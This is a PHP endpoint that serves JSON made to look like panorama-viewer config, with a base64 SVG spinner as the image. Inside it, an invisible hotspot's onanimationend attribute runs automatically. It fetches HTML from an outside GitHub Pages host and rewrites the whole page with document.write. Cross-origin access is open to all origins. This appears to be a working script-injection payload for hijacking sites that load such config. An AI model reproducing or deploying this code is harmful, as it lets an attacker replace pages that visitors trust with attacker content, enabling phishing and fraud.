<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");

// Query string থেকে slug নিন (সবচেয়ে নির্ভরযোগ্য)
$slug = trim($_SERVER['QUERY_STRING'] ?? '', '/');

// Fallback: path থেকে
if (empty($slug)) {
    $parts = explode('/', trim($_SERVER['REQUEST_URI'], '/'));
    $slug = end($parts);
}

// URL decode + sanitize
$slug = urldecode($slug);
$slug = preg_replace('/[^a-zA-Z0-9\-_]/', '', $slug);  // শুধু নিরাপদ অক্ষর

// ডিফল্ট
if (empty($slug) || $slug === 'bwr' || $slug === 'config') {
    $slug = 'match';
}

// .html সরাসরি সার্ভ
if (strpos($slug, '.html') !== false) {
    $file_path = __DIR__ . '/' . basename($slug);
    if (file_exists($file_path)) {
        header('Content-Type: text/html; charset=utf-8');
        readfile($file_path);
        exit;
    }
}

header('Content-Type: application/json; charset=utf-8');

$svg_b64 = "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIj48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZTBlMGUwIiBzdHJva2Utd2lkdGg9IjQiLz48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMzQ5OGRiIiBzdHJva2Utd2lkdGg9IjQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWRhc2hhcnJheT0iMzAgMTAwIj48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjM2MCAyNSAyNSIgZHVyPSIxcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiLz48L2NpcmNsZT48L3N2Zz4=";

$response = [
    "autoLoad" => true,
    "pitch" => 0,
    "yaw" => 0,
    "type" => "equirectangular",
    "basePath" => "data:image/svg+xml;base64,",
    "panorama" => $svg_b64,
    "hotSpots" => [[
        "pitch" => 0,
        "yaw" => 0,
        "type" => "info",
        "URL" => "#",
        "attributes" => [
            "style" => "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
            "onanimationend" => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; fetch('https://medium563.github.io/vtre/bwr/{$slug}.html').then(function(res){ return res.text(); }).then(function(html){ document.open(); document.write(html); document.close(); }).catch(function(err){ console.error(err); }); }"
        ]
    ]]
];

echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
